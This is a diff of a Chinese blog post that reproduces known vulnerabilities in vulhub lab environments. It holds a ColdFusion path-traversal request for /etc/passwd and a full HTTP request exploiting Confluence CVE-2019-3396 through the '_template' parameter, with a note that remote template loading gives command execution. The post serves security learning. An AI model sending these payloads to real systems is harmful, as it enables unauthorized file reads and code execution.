@@ -70,8 +70,13 @@
 <meta property="og:image" content="http://sovohelp.fit/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20230105172729376.png">
 <meta property="og:image" content="http://sovohelp.fit/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20230105172840904.png">
 <meta property="og:image" content="http://sovohelp.fit/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20230105173048584.png">
+<meta property="og:image" content="http://sovohelp.fit/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20230106224055744.png">
+<meta property="og:image" content="http://sovohelp.fit/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20230106224252873.png">
+<meta property="og:image" content="http://sovohelp.fit/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20230106224330031.png">
+<meta property="og:image" content="http://sovohelp.fit/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20230106224613674.png">
+<meta property="og:image" content="http://sovohelp.fit/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20230106230557042.png">
 <meta property="article:published_time" content="2023-01-02T09:50:11.000Z">
-<meta property="article:modified_time" content="2023-01-05T10:04:32.667Z">
+<meta property="article:modified_time" content="2023-01-06T15:09:55.421Z">
 <meta property="article:author" content="sovo">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="http://sovohelp.fit/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/ff97801964cf1ba1c11b82c363117292.png">
@@ -296,7 +301,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          12k 字
+          13k 字
         
       </span>
     
@@ -307,7 +312,7 @@
         
         
         
-          101 分钟
+          110 分钟
         
       </span>
     
@@ -564,6 +569,23 @@
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/CFIDE/</span>administrator<span class="hljs-regexp">/enter.cfm?locale=../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/etc/</span>passwd%<span class="hljs-number">00</span>en<br></code></pre></td></tr></table></figure>
 
 <img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20230105173048584.png" srcset="/img/loading.gif" lazyload class="" title="image-20230105173048584">
+
+<h2 id="Adobe-ColdFusion-反序列化漏洞（CVE-2017-3066）"><a href="#Adobe-ColdFusion-反序列化漏洞（CVE-2017-3066）" class="headerlink" title="Adobe ColdFusion 反序列化漏洞（CVE-2017-3066）"></a>Adobe ColdFusion 反序列化漏洞（CVE-2017-3066）</h2><p>这个vulhub给出的工具出现了问题，在阅读源码后暂时无法解决，java还没学好，后续再解决</p>
+<h2 id="Atlassian-Confluence-路径穿越与命令执行漏洞（CVE-2019-3396）"><a href="#Atlassian-Confluence-路径穿越与命令执行漏洞（CVE-2019-3396）" class="headerlink" title="Atlassian Confluence 路径穿越与命令执行漏洞（CVE-2019-3396）"></a>Atlassian Confluence 路径穿越与命令执行漏洞（CVE-2019-3396）</h2><p>Atlassian Confluence是企业广泛使用的wiki系统，其6.14.2版本前存在一处未授权的目录穿越漏洞，通过该漏洞，攻击者可以读取任意文件，或利用Velocity模板注入执行任意命令。</p>
+<h3 id="靶场-2"><a href="#靶场-2" class="headerlink" title="靶场"></a>靶场</h3><img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20230106224055744.png" srcset="/img/loading.gif" lazyload class="" title="image-20230106224055744">
+
+<img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20230106224252873.png" srcset="/img/loading.gif" lazyload class="" title="image-20230106224252873">
+
+<img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20230106224330031.png" srcset="/img/loading.gif" lazyload class="" title="image-20230106224330031">
+
+<img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20230106224613674.png" srcset="/img/loading.gif" lazyload class="" title="image-20230106224613674">
+
+<p>数据库账号密码均为postgres</p>
+<h3 id="复现-6"><a href="#复现-6" class="headerlink" title="复现"></a>复现</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/rest/tinymce/1/macro/preview</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost:8090<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost:8090/pages/resumedraft.action?draftId=786457&amp;draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&amp;<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json; charset=utf-8<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>170<br><br><span class="language-json"></span><br><span class="language-json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;contentId&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;786458&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;macro&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;widget&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;body&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;params&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;url&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;https://www.viddler.com/v/23464dc6&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;width&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;1000&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;height&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;1000&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;_template&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;../web.xml&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span></span><br></code></pre></td></tr></table></figure>
+
+<img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20230106230557042.png" srcset="/img/loading.gif" lazyload class="" title="image-20230106230557042">
+
+<p><code>_template</code>可通过http远程加载模板，进而通过模板注入执行命令，另外也可以通过file协议读文件</p>
 
                 
               </div>
